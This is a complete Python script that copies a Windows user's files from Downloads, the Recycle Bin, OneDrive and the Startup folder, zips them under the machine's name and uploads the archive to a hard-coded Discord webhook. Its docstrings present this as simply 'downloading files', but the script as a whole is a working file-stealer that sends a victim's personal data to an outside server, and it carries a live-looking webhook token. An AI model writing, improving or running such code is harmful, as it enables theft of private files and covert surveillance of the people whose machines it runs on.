import os
import zipfile
import requests
from pathlib import Path
import shutil # Added import for shutil module

def download_files(user_profile_path):
    """Downloads files from the user's browser, bin, downloads, OneDrive, and AppData folders.

    Args:
        user_profile_path (str): The path to the user's profile directory.

    Returns:
        str: The path to the ZIP file containing the downloaded files.
    """

    # Create a temporary directory to store the downloaded files
    temp_dir = os.path.join(os.path.expanduser("~"), "temp_downloads")
    os.makedirs(temp_dir, exist_ok=True)

    # Define the folders to download files from
    folders = [
        os.path.join(user_profile_path, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Downloads"),
        os.path.join(user_profile_path, "Downloads"),
        os.path.join(user_profile_path, "AppData", "Local", "Microsoft", "Windows", "Bin"),
        os.path.join(user_profile_path, "AppData", "Local", "Microsoft", "OneDrive", "Users", "Default"),
        os.path.join(user_profile_path, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    ]

    # Download files from each folder
    for folder in folders:
        if os.path.exists(folder):
            for filename in os.listdir(folder):
                source_path = os.path.join(folder, filename)
                destination_path = os.path.join(temp_dir, filename)
                if os.path.isfile(source_path):
                    shutil.copy(source_path, destination_path) # Using shutil.copy instead of os.copy

    # Create a ZIP archive of the downloaded files
    computer_name = os.getenv("COMPUTERNAME")
    zip_filename = os.path.join(temp_dir, f"{computer_name}_user_files.zip")
    with zipfile.ZipFile(zip_filename, "w") as zipf:
        for root, dirs, files in os.walk(temp_dir):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), temp_dir))

    return zip_filename

def send_webhook(zip_filename, webhook_url):
    """Sends the ZIP file to a webhook URL.

    Args:
        zip_filename (str): The path to the ZIP file.
        webhook_url (str): The URL of the webhook.
    """

    with open(zip_filename, "rb") as f:
        files = {"file": f}
        response = requests.post(webhook_url, files=files)

    if response.status_code == 200:
        print("ZIP file sent successfully!")
    else:
        print(f"Error sending ZIP file: {response.status_code}")

# Get the user's profile directory
user_profile_path = os.path.expanduser("~")

# Download files and create a ZIP archive
zip_filename = download_files(user_profile_path)

# Replace with your actual webhook URL
webhook_url = "https://discord.com/api/webhooks/1363659544231809165/rb75sKsq3XKlMvG1DKtLRinztpbvQSBHDAyLcE3Tz-B7RF3MSxAtyzjD720V1tLP3ugZ" 

# Send the ZIP file to the webhook
send_webhook(zip_filename, webhook_url)